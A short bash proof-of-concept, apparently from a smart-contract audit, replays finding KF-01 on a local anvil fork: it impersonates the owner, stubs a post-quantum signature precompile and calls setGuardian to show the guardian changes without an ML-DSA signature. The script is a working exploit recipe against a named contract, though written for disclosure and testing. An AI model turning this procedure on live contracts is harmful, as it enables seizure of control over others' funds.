#!/usr/bin/env bash
# Keyfall replay: KF-01 (High) — setGuardian(address) succeeds for owner() without any PQC signature
# Runs on a LOCAL fork only. Needs Foundry (anvil + cast).
set -euo pipefail
anvil --fork-url https://evm-testnet.qore.host --fork-block-number 10311193 --chain-id 9800 --port 8555 --silent & ANVIL=$!; trap "kill $ANVIL" EXIT; sleep 6
R=http://127.0.0.1:8555
cast rpc anvil_setCode 0x0000000000000000000000000000000000000a01 0x600060005260206000f3 --rpc-url $R >/dev/null  # reject: attacker has no ML-DSA-87 key
cast rpc anvil_impersonateAccount 0x3184924416dF6C43b4c66171fBc75121fF27465B --rpc-url $R >/dev/null
cast rpc anvil_setBalance 0x3184924416dF6C43b4c66171fBc75121fF27465B 0x3635c9adc5dea00000 --rpc-url $R >/dev/null
echo "target balance before: $(cast balance 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 --rpc-url $R)"
cast send --unlocked --from 0x3184924416dF6C43b4c66171fBc75121fF27465B 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 0x8a0dac4a0000000000000000000000009e0cfda32b3fd575206d5070dee51f72d6d390bc --gas-limit 15000000 --rpc-url $R >/dev/null
echo "target balance after:  $(cast balance 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 --rpc-url $R)"
echo "guardian(): $(cast call 0x67508e00454A1f66BF4564C8a3c3B913C878b1b1 'guardian()' --rpc-url $R)"
